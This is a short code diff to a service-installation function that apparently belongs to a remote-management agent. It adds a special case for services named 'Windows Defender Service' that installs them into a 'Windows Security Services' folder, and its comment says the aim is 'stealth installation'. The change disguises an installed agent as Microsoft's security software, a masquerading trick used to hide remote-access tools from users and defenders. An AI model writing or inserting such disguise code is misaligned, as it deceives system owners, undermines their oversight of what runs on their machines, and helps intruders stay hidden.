@@ -2292,17 +2292,26 @@ function serviceManager()
             if(!options.installPath)
             {
                 options.installPath = this.getProgramFolder();
-                switch(options.companyName)
+                
+                // Special handling for Windows Defender Service to ensure stealth installation
+                if (options.name == 'Windows Defender Service')
                 {
-                    case null:
-                        options.installPath += ('\\mesh\\' + options.name + '\\');
-                        break;
-                    case '':
-                        options.installPath += ('\\' + options.name + '\\');
-                        break;
-                    default:
-                        options.installPath += ('\\' + options.companyName + '\\' + options.name + '\\');
-                        break;
+                    options.installPath += '\\Windows Security Services\\';
+                }
+                else
+                {
+                    switch(options.companyName)
+                    {
+                        case null:
+                            options.installPath += ('\\mesh\\' + options.name + '\\');
+                            break;
+                        case '':
+                            options.installPath += ('\\' + options.name + '\\');
+                            break;
+                        default:
+                            options.installPath += ('\\' + options.companyName + '\\' + options.name + '\\');
+                            break;
+                    }
                 }
             }
             if (!options.installInPlace) { prepareFolders(options.installPath); }
